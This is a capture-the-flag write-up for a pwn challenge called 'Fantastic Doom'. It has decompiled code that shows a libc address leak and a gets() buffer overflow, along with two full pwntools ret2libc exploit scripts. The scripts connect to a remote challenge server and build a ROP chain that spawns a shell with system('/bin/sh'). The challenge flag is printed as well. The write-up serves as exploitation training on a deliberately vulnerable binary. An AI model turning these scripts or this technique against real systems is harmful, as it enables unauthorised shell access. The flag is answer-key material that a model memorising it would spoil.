# fantastic_doom [pwn]

## 問題概要

# Fantastic Doom
Doctor Doom, the monarch of Latveria has made many doombots. You working with the Fantastic 4 have to access doombot machine and foil his plans of releasing doombots.

`difficulty: medium`

`authors: nrg, the_moon_guy`

## Flag
```
EH4X{st4n_l33_c4m30_m1ss1ng_dOOoOoOoOoOOm}
```

## Solution

This challenge is a ret2libc attack

---

## Writeup

# Fantastic Doom Writeup

**Challenge Text:** Doctor Doom, the monarch of Latveria has made many doombots. You working with the Fantastic 4 have to access doombot machine and foil his plans of releasing doombots.

**Author:** `nrg & the_moon_guy`

The handout contained a chall file, libc and a linker. So first change the default libc of the chall file using pathelf. *(Rename the libc file to libc.so.6)*

```bash
patchelf --set-interpreter ./ld-2.27.so --set-rpath . chall
```

When we run the binary we get a long output full of dOoOoOoOms.

```bash
Hemlo Doombot69!
0x444F4F4F4F4F4F4F4F4D0x444F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4D0x444F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4D0x444F4F4F4F4F4F4F4F4F4F4D0x444F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4D0x444F4F4F4F4F4F4F4F4F4F4D0x444F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4D0x444F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4D0x444F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4D0x444F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4D0x444F4F4F4F4F4F4F4F4F4F4F4F4F4D0x444F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4D0x444F4F4F4F4F4F4F4F4F4D0x444F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4D0x444F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4D0x444F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4D0x444F4F4F4F4F4F4F4F4D0x444F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4D0x444F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4D0x444F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4D0x444F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4D0x444F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4D0x444F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4D0x444F4F4F4F4F4F4F4F4F4F4F4F4D0x444F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4D0x444F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4D0x444F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4D0x444F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4D0x444F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4D0x444F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4D0x444F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4D0x444F4F4F4D0x444F4F4F4F4F4F4D0x444F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4D0x444F4F4F4F4F4F4F4F4F4F4D0x444F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4D0x444F4F4F4F4F4F4F4F4D0x444F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4D0x444F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4D0x444F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4D0x444F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4D0x444F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4D0x444F4F4F4F4F4F4F4F4F4F4D0x7dc39a52a5600x444F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4D0x444F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4D0x444F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4D0x444F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4D0x444F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4D0x444F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4D0x444F4F4D0x444F4F4F4F4F4F4F4F4F4F4F4F4F4D0x444F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4D0x444F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4D0x444F4F4F4F4F4F4F4F4F4F4F4D0x444F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4D0x444F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4D0x444F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4D0x444F4F4F4F4F4F4F4F4F4F4F4F4F4F4D0x444F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4D0x444F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4D0x444F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4D0x444F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4D0x444F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4D0x444F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4D0x444F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4D0x444F4F4D0x444F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4D0x444F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4D0x444F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4F4D
Enter authcode: 
```
On decompiling the binary we can see the code:

```c
undefined8 main(void)

{
  int iVar1;
  time_t tVar2;
  long lVar3;
  undefined8 *puVar4;
  byte bVar5;
  undefined8 local_a8 [17];
  int local_1c;
  ulong local_18;
  ulong local_10;
  
  bVar5 = 0;
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stderr,(char *)0x0,2,0);
  tVar2 = time((time_t *)0x0);
  srand((uint)tVar2);
  puts("Hemlo Doombot69!");
  for (local_10 = 0; local_10 < 0x45; local_10 = local_10 + 1) {
    iVar1 = rand();
    local_1c = iVar1 % 0x2a + 2;
    printf("0x44");
    for (local_18 = 0; local_18 < (ulong)(long)local_1c; local_18 = local_18 + 1) {
      printf("4F");
    }
    printf("4D");
    if (local_10 == 0x2a) {
      printf("%p",wctrans);
    }
  }
  printf("\nEnter authcode: ");
  puVar4 = local_a8;
  for (lVar3 = 0x10; lVar3 != 0; lVar3 = lVar3 + -1) {
    *puVar4 = 0;
    puVar4 = puVar4 + (ulong)bVar5 * -2 + 1;
  }
  gets((char *)local_a8);
  puts("Failed Login");
  return 0;
}
```

We can see that at someplace it is printing the address of `wctrans()`. Some random C function which even I had heard of the first time. 

Also the input field is using `gets()`.

This is clearly a sign of a `ret2libc` attack. We need to find the offset of the `system()` function from `wctrans` and add it to the address of `wctrans` and overwrite the `Instruction Pointer` with that address along with the argument as `/bin/sh` in the `rdi register` to get the system shell access. 

The Solution Script is as follows:
```python
from pwn import *

bb = ELF("./chall_patched")
libc = ELF("./libc.so.6")

main = bb.symbols["main"]

rop = ROP(bb)

pop_rdi = rop.find_gadget(["pop rdi"])
if pop_rdi == None:
    print("blunder hui gawa")
    exit(-1)
else:
    pop_rdi = pop_rdi[0]

ret = rop.find_gadget(["ret"])
if ret == None:
    print("blunder hui gawa")
    exit(-1)
else:
    ret = ret[0]

context.binary = bb


# r = process("./chall_patched")
r = remote("20.244.35.227", 4269)
r.recvuntil("0x7")
midahhparse = b"0x7" + r.recvuntil("0x")
leak = int(midahhparse[:-2], 16)
print(f"{hex(leak)=}")

libc_base = leak - libc.symbols["wctrans"]
print(f"{hex(libc_base)=}")
libc.address = libc_base

system = libc.symbols["system"]
sh = next(libc.search(b"/bin/sh\x00"))
print(f"{hex(system)=}")
print(f"{hex(sh)=}")

payload = b"".join([
    b"A"*168,
    p64(pop_rdi),
    p64(sh),
    p64(ret),
    p64(system),
])

r.recvuntil(': ')

r.sendline(payload)

r.interactive()
```

We can then simple get the flag by executing `cat flag.txt`. This gives away the flag (rip Stan Lee):
```
EH4X{st4n_l33_c4m30_m1ss1ng_dOOoOoOoOoOOm}
```

---

## 解法スクリプト: soln.py

```python
from pwn import *

bb = ELF("./chall")
libc = ELF("./libc.so.6")

main = bb.symbols["main"]

rop = ROP(bb)

pop_rdi = rop.find_gadget(["pop rdi"])
if pop_rdi == None:
    print("blunder hui gawa")
    exit(-1)
else:
    pop_rdi = pop_rdi[0]

ret = rop.find_gadget(["ret"])
if ret == None:
    print("blunder hui gawa")
    exit(-1)
else:
    ret = ret[0]

context.binary = bb

# r = gdb.debug([bb.path])
# r = process("./chall_patched")
r = remote("20.244.35.227", 4269)
r.recvuntil("0x7")
midahhparse = b"0x7" + r.recvuntil("0x")
leak = int(midahhparse[:-2], 16)
print(f"{hex(leak)=}")

# payload = b"".join([
#     b"A"*168,
#     p64(main),
# ])
#
# r.sendline(payload)
#
# print("sent")

libc_base = leak - libc.symbols["wctrans"]
print(f"{hex(libc_base)=}")
libc.address = libc_base

system = libc.symbols["system"] # + 0x9e10
sh = next(libc.search(b"/bin/sh\x00")) #+ 0x36bb
print(f"{hex(system)=}")
print(f"{hex(sh)=}")

payload = b"".join([
    b"A"*168,
    # p64(ret),
    p64(pop_rdi),
    p64(sh),
    p64(ret),
    p64(system),
])

r.recvuntil(': ')

r.sendline(payload)

r.interactive()
```